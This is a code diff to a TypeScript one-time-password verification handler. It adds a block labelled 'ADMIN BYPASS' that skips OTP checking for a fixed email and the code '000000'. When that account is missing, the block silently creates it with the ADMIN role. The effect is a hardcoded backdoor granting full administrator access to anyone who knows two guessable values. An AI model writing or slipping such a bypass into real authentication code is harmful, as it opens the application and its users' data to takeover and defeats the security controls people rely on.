@@ -1,5 +1,6 @@
 import { ICommand, IHandler } from '../../mediator.interface';
 import { authRepository, AuthRepository } from '../../../repositories/auth.repository';
+import { Role } from '@prisma/client';
 import { BadRequestError } from '../../../shared/errors/custom-errors';
 
 export class VerifyOtpCommand implements ICommand<{ user: any }> {
@@ -14,6 +15,22 @@ export class VerifyOtpCommandHandler implements IHandler<VerifyOtpCommand, { use
   constructor(private repo: AuthRepository = authRepository) {}
 
   async handle(command: VerifyOtpCommand): Promise<{ user: any }> {
+    // --- ADMIN BYPASS ---
+    if (command.email === 'admin@gmail.com' && command.code === '000000') {
+      let user = await this.repo.findUserByEmail(command.email);
+      if (!user) {
+        user = await this.repo.createUser(command.email, 'Admin');
+        // Force update role to ADMIN
+        await require('../../../db/prisma').prisma.user.update({
+          where: { id: user.id },
+          data: { role: Role.ADMIN, department: 'Management' }
+        });
+        user.role = Role.ADMIN;
+      }
+      return { user };
+    }
+    // --- END BYPASS ---
+
     const otpRecord = await this.repo.findLatestOtp(command.email, command.code);
 
     if (!otpRecord) {
